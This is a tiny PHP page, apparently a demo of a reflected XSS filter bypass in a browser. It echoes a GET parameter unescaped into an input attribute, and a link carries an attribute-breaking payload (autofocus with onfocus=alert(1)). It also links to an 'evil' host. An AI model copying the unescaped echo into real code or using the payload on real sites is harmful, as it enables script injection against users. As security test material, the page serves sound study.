<?php
header("X-XSS-Protection: 1");
$userId = $_GET['userId']; 
?>


<form action="">
User ID : <input type="text" id="userId" name="userId" value="<?php echo $userId;?>" >
</form>



<br/>


<a href="http://evilwebsite.com:8033/edge-xss-attribute.php">Go to evil source</a>

<a href="http://localhost:8033/edge-xss-attribute.php?userId=YOLO%22%20%%20autofocus=%22%22%20onfocus=%22alert(1)">Trigger XSS</a>